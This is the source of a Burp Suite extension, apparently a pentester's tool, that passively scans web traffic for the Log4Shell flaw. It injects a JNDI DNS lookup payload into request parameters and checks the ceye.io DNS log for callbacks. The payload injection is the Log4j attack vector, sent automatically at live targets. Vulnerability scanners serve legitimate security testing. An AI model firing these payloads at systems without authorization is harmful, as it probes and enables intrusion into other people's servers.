# encoding:utf8
from burp import IBurpExtender, IScannerCheck, IScanIssue
from string import ascii_lowercase
from urllib import quote
from time import sleep
import random
import urllib2
import json
import re

_name_ = 'Log4j2 被动扫描'
_author_ = 'nul1'


class Ceye:
    def __init__(self, rand):
        # 配置ceye信息
        self.host = ""
        self.token = ""
        self.rand = rand


    def get_dns(self):
        try:
            url = "http://api.ceye.io/v1/records?token={}&type=dns&filter={}".format(self.token, self.rand)
            
            headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.73 Safari/537.36'}
            r = urllib2.urlopen(url).read();
            json_data = json.loads(r)

            if json_data['data']:
                for row in json_data["data"]:
                    return "{} [{}]".format(row.get('name'), row.get('remote_addr'))
            else:
                return None
        except Exception as e:
            return None



class BurpExtender(IBurpExtender, IScannerCheck):
    
    def registerExtenderCallbacks(self, callbacks):
        self._callbacks = callbacks
        self._helpers = callbacks.getHelpers()
        self._callbacks.setExtensionName("PassiveLog4Scan")
        callbacks.registerScannerCheck(self)

        print('[+] Load PassiveLog4j Success - by nul1')



    def randomString(self, length=8):
        return ''.join([random.choice(ascii_lowercase) for _ in range(length)])


    def urlFilter(self, url):
        url = url.split('?')[0]
        rer = re.findall("\\.(7z|avi|bin|bmp|bz|bz2|css|csv|doc|docx|eot|epub|gif|gz|ico|ics|jar|jfif|jpe|jpeg|jpg|m3u|mp2|mp3|mpeg|mpg|pbm|pdf|png|ppt|pptx|ra|ram|rar|snd|svg|swf|tar|tif|tiff|ttf|vsd|wav|weba|webm|webp|woff|woff2|xbm|xls|xlsx|xpm|xul|xwd|zip|zip)", url)

        return False if rer != [] else True


    def doPassiveScan(self, baseRequestResponse):
        request = baseRequestResponse.getRequest()

        analyzedIRequestInfo = self._helpers.analyzeRequest(baseRequestResponse)  
        
        httpService = baseRequestResponse.getHttpService()   

        reqHeaders = list(analyzedIRequestInfo.getHeaders())
        reqParameters = analyzedIRequestInfo.getParameters()  
        reqUrl = analyzedIRequestInfo.getUrl().toString()
        reqBodys = request[analyzedIRequestInfo.getBodyOffset():]


        if self.urlFilter(reqUrl):

            for parameter in reqParameters:
                parameterName, parameterValue, parameterType = parameter.getName(), parameter.getValue(), parameter.getType()

                # 去除Cookie
                if parameterType != 2:
                    rand = self.randomString()
                    ceye = Ceye(rand)
                    domain = reqUrl.split('//')[1].split('.')[0]

                    payload = [quote("${{jndi:dns://{}.{}.{}/test}}".format(rand, domain, ceye.host))]

                    for p in payload:

                        parameterValuePayload = p
                        #print("[*] scan -> " + parameterName + '=' + parameterValuePayload)
    
                        newParameter = self._helpers.buildParameter(parameterName, parameterValuePayload, parameterType)

                        newRequest = self._helpers.updateParameter(request, newParameter)
                        newIHttpRequestResponse = self._callbacks.makeHttpRequest(httpService, newRequest)
                        response = newIHttpRequestResponse.getResponse() 

                        analyzedIResponseInfo = self._helpers.analyzeResponse(response)  
                        resBodys = response[analyzedIResponseInfo.getBodyOffset():].tostring()
                         
                        # 设置延迟，获取dnslog
                        sleep(1.5)
                        dnslog = ceye.get_dns()

                        if dnslog:
                            print('[+] Find Log4shell -> {} -> {}'.format(parameterName+'='+parameterValue, dnslog))
                            issue = CustomIssue(
                                BasePair= baseRequestResponse,  
                                IssueName='Log4j2 RCE',
                                IssueDetail='Log4j Payload -> ' + parameterName + '=' + parameterValuePayload,
                                Severity='High',
                                Confidence='Certain'
                            )

                            self._callbacks.addScanIssue(issue)
                            return


    def consolidateDuplicateIssues(self, existingIssue, newIssue):
        if existingIssue.getIssueName() == newIssue.getIssueName():
            return -1
        return 0


class CustomIssue(IScanIssue):
    def __init__(self, BasePair, Confidence='Certain', IssueBackground=None, IssueDetail=None, IssueName=None, RemediationBackground=None, RemediationDetail=None, Severity=None):
        self.HttpMessages=[BasePair]
        self.HttpService=BasePair.getHttpService()
        self.Url=BasePair.getUrl() 
        self.Confidence = Confidence
        self.IssueBackground = IssueBackground 
        self.IssueDetail = IssueDetail
        self.IssueName = IssueName
        self.RemediationBackground = RemediationBackground 
        self.RemediationDetail = RemediationDetail 
        self.Severity = Severity 


    def getHttpMessages(self):
        return self.HttpMessages

    def getHttpService(self):
        return self.HttpService

    def getUrl(self):
        return self.Url

    def getConfidence(self):
        return self.Confidence

    def getIssueBackground(self):
        return self.IssueBackground

    def getIssueDetail(self):
        return self.IssueDetail

    def getIssueName(self):
        return self.IssueName

    def getIssueType(self):
        return self.IssueType

    def getRemediationBackground(self):
        return self.RemediationBackground

    def getRemediationDetail(self):
        return self.RemediationDetail

    def getSeverity(self):
        return self.Severity



